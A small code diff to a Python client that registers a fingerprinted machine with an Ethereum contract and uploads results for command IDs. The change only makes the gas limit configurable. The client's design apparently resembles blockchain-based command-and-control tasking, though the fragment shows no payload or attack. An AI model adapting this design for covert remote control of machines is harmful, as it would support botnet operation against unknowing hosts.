@@ -49,6 +49,7 @@ class ClientCommands:
         importAccountToNode(self.web3, self.address, self.private, self.password)
 
         self.sessionId=None
+        self.gasLimit_ev = int(conf['gasLimit_ev'])
 
 
     def waitForNodeToSync(self):
@@ -77,7 +78,7 @@ class ClientCommands:
         try:
             machineId = OsInteractions.fingerprintMachine()
             machineIdEnc = self.encryptMessageForServer(machineId)
-            self.contract.registerInstance(machineIdEnc, transact={'from': self.address, 'gas': 3000000})
+            self.contract.registerInstance(machineIdEnc, transact={'from': self.address, 'gas': self.gasLimit_ev})
 
             self.commandFilter, eventABI = createLogEventFilter(REGISTRATION_CONFIRMATION_EVENT_NAME,
                                                                 self.contractAbi,
@@ -127,7 +128,7 @@ class ClientCommands:
         machineId = OsInteractions.fingerprintMachine()
         sessionAndMachineIdHash = toBytes32Hash(self.sessionId + machineId)
         #function uploadWorkResults (bytes32 sessionAndMachineIdHash, string result, uint16 cmdId)
-        self.contract.uploadWorkResults(sessionAndMachineIdHash, workResults, cmdId, transact={'from': self.address, 'gas': 3000000})
+        self.contract.uploadWorkResults(sessionAndMachineIdHash, workResults, cmdId, transact={'from': self.address, 'gas': self.gasLimit_ev})
 
     def decryptMessageFromServer(self, msg, encrypt=True):
         # if encrypt:
